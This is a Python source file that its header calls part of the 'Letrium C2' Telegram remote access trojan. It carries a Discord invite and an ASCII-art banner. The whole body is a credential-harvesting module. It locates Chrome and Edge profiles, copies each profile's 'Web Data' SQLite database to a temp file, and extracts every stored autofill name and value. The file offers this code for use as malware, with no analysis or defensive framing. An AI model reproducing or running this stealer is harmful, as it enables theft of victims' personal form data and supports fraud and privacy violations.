# Letrium C2 - Telegram RAT by cybermad
# Dont copy this code without permission
# Discord - https://discord.gg/RUc432Nc
# _          _        _                 
#| |        | |      (_)                
#| |     ___| |_ _ __ _ _   _ _ __ ___  
#| |    / _ \ __| '__| | | | | '_ ` _ \ 
#| |___|  __/ |_| |  | | |_| | | | | | |
#\_____/\___|\__|_|  |_|\__,_|_| |_| |_|









import os
import shutil
import sqlite3

LOCAL = os.getenv("LOCALAPPDATA")
PATHS = {
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
}

def autofill():
    res = []
    for browser, base in PATHS.items():
        if not os.path.exists(base):
            continue
        for profile in os.listdir(base):
            if not (profile == "Default" or profile.startswith("Profile")):
                continue
            db = os.path.join(base, profile, "Web Data")
            if not os.path.exists(db):
                continue

            tmp = os.path.join(os.getenv("TEMP"), "webdata_tmp.db")
            try:
                shutil.copy2(db, tmp)
                conn = sqlite3.connect(tmp)
                cur = conn.cursor()
                cur.execute("SELECT name, value FROM autofill")

                for name, value in cur.fetchall():
                    if name.strip() or value.strip():
                        res.append({                                       
                            "browser": browser,
                            "name": name,
                            "value": value
                        })
                cur.close()
                conn.close()
            except:
                continue
            finally:
                if os.path.exists(tmp):
                    os.remove(tmp)
    return res